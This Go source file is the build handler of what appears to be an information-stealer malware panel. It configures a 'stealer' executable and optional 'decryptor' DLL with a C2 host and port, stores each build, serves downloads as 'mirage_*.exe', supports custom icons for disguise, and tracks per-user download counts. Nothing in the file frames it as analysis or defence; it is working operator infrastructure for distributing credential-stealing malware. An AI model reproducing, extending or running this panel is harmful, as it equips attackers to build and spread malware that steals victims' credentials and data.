package api

import (
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"

	"github.com/go-chi/chi/v5"
	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/services"
)

var safeIDPattern = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)

func safeIDParam(r *http.Request) string {
	id := chi.URLParam(r, "id")
	if !safeIDPattern.MatchString(id) {
		return ""
	}
	return id
}

type BuildHandler struct {
	service      *services.BuildService
	stealerExe   []byte
	decryptorDll []byte
	db           *sql.DB
}

func NewBuildHandler(service *services.BuildService, stealer, decryptor []byte, db *sql.DB) *BuildHandler {
	return &BuildHandler{
		service:      service,
		stealerExe:   stealer,
		decryptorDll: decryptor,
		db:           db,
	}
}

func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request) {
	var config services.BuildConfig
	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}

	if config.C2Host == "" || config.C2Port == 0 {
		writeError(w, http.StatusBadRequest, "c2_host and c2_port are required")
		return
	}

	if len(config.C2Host) > 256 {
		writeError(w, http.StatusBadRequest, "c2_host must be 256 characters or fewer")
		return
	}

	if config.C2Port < 1 || config.C2Port > 65535 {
		writeError(w, http.StatusBadRequest, "c2_port must be between 1 and 65535")
		return
	}

	var decryptor []byte
	if config.IncludeDecryptor && len(h.decryptorDll) > 0 {
		decryptor = h.decryptorDll
	}

	built, err := h.service.Build(h.stealerExe, decryptor, config)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}

	configJSON, _ := json.Marshal(config)
	configHash := fmt.Sprintf("%x", sha256.Sum256(configJSON))
	fileHash := sha256.Sum256(built)
	sha := hex.EncodeToString(fileHash[:])

	modulesJSON, _ := json.Marshal(config.Modules)

	result, err := h.db.Exec(
		`INSERT INTO builds (config_hash, file_size, file_data, sha256, build_tag, module_config, user_id)
		 VALUES (?, ?, ?, ?, ?, ?, ?)`,
		configHash, len(built), built, sha, config.BuildTag, string(modulesJSON), claimsUserID(r),
	)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to store build")
		return
	}

	id, _ := result.LastInsertId()

	var buildID, createdAt string
	h.db.QueryRow("SELECT id, created_at FROM builds WHERE rowid = ?", id).Scan(&buildID, &createdAt)

	writeJSON(w, http.StatusCreated, map[string]any{
		"id":         buildID,
		"file_size":  len(built),
		"sha256":     sha,
		"build_tag":  config.BuildTag,
		"created_at": createdAt,
	})
}

func (h *BuildHandler) List(w http.ResponseWriter, r *http.Request) {
	tagFilter := r.URL.Query().Get("tag")

	var rows *sql.Rows
	var err error
	if tagFilter != "" {
		if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
			rows, err = h.db.Query(`
				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
				FROM builds WHERE build_tag = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50
			`, tagFilter, claims.UserID)
		} else {
			rows, err = h.db.Query(`
				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
				FROM builds WHERE build_tag = ? ORDER BY created_at DESC LIMIT 50
			`, tagFilter)
		}
	} else {
		if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
			rows, err = h.db.Query(`
				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
				FROM builds WHERE user_id = ? ORDER BY created_at DESC LIMIT 50
			`, claims.UserID)
		} else {
			rows, err = h.db.Query(`
				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
				FROM builds ORDER BY created_at DESC LIMIT 50
			`)
		}
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query builds")
		return
	}
	defer rows.Close()

	type buildEntry struct {
		ID            string          `json:"id"`
		ConfigHash    string          `json:"config_hash,omitempty"`
		FileSize      int             `json:"file_size"`
		Sha256        string          `json:"sha256,omitempty"`
		BuildTag      string          `json:"build_tag,omitempty"`
		DownloadCount int             `json:"download_count"`
		ModuleConfig  json.RawMessage `json:"module_config,omitempty"`
		CreatedAt     string          `json:"created_at"`
	}

	builds := make([]buildEntry, 0)
	for rows.Next() {
		var b buildEntry
		var mc string
		if err := rows.Scan(&b.ID, &b.ConfigHash, &b.FileSize, &b.Sha256, &b.BuildTag, &b.DownloadCount, &b.CreatedAt, &mc); err != nil {
			continue
		}
		if mc != "" && mc != "{}" {
			b.ModuleConfig = json.RawMessage(mc)
		}
		builds = append(builds, b)
	}

	writeJSON(w, http.StatusOK, builds)
}

func (h *BuildHandler) Download(w http.ResponseWriter, r *http.Request) {
	id := safeIDParam(r)
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing or invalid build id")
		return
	}

	var fileData []byte
	var sha string
	err := h.db.QueryRow("SELECT file_data, sha256 FROM builds WHERE id = ?", id).Scan(&fileData, &sha)
	if err == sql.ErrNoRows {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to fetch build")
		return
	}

	if !h.ownsBuild(r, id) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	h.db.Exec("UPDATE builds SET download_count = download_count + 1 WHERE id = ?", id)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="mirage_%s.exe"`, id[:8]))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(fileData)))
	w.Write(fileData)
}

func (h *BuildHandler) UpdateTag(w http.ResponseWriter, r *http.Request) {
	id := safeIDParam(r)
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing or invalid build id")
		return
	}

	var body struct {
		Tag string `json:"tag"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}

	if !h.ownsBuild(r, id) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	result, err := h.db.Exec("UPDATE builds SET build_tag = ? WHERE id = ?", body.Tag, id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to update build tag")
		return
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{"id": id, "build_tag": body.Tag})
}

func (h *BuildHandler) UploadIcon(w http.ResponseWriter, r *http.Request) {
	id := safeIDParam(r)
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing or invalid build id")
		return
	}

	if !h.ownsBuild(r, id) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, 256<<10)
	if err := r.ParseMultipartForm(256 << 10); err != nil {
		writeError(w, http.StatusBadRequest, "invalid multipart form or file too large")
		return
	}

	file, _, err := r.FormFile("icon")
	if err != nil {
		writeError(w, http.StatusBadRequest, "icon file required")
		return
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to read icon")
		return
	}

	iconDir := "data/icons"
	if err := os.MkdirAll(iconDir, 0755); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create icon directory")
		return
	}

	iconPath := filepath.Join(iconDir, filepath.Base(id+".ico"))
	if err := os.WriteFile(iconPath, data, 0644); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save icon")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"id":   id,
		"size": len(data),
	})
}

func (h *BuildHandler) ownsBuild(r *http.Request, buildID string) bool {
	return buildOwnedBy(h.db, r, buildID)
}

func (h *BuildHandler) Stats(w http.ResponseWriter, r *http.Request) {
	var rows *sql.Rows
	var err error
	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
		rows, err = h.db.Query(`
			SELECT id, COALESCE(build_tag,''), download_count, file_size, created_at
			FROM builds WHERE user_id = ? ORDER BY created_at DESC
		`, claims.UserID)
	} else {
		rows, err = h.db.Query(`
			SELECT id, COALESCE(build_tag,''), download_count, file_size, created_at
			FROM builds ORDER BY created_at DESC
		`)
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query stats")
		return
	}
	defer rows.Close()

	type statEntry struct {
		ID            string `json:"id"`
		BuildTag      string `json:"build_tag,omitempty"`
		DownloadCount int    `json:"download_count"`
		FileSize      int    `json:"file_size"`
		CreatedAt     string `json:"created_at"`
	}

	stats := make([]statEntry, 0)
	var totalDownloads int
	for rows.Next() {
		var s statEntry
		if err := rows.Scan(&s.ID, &s.BuildTag, &s.DownloadCount, &s.FileSize, &s.CreatedAt); err != nil {
			continue
		}
		totalDownloads += s.DownloadCount
		stats = append(stats, s)
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"builds":          stats,
		"total_downloads": totalDownloads,
	})
}
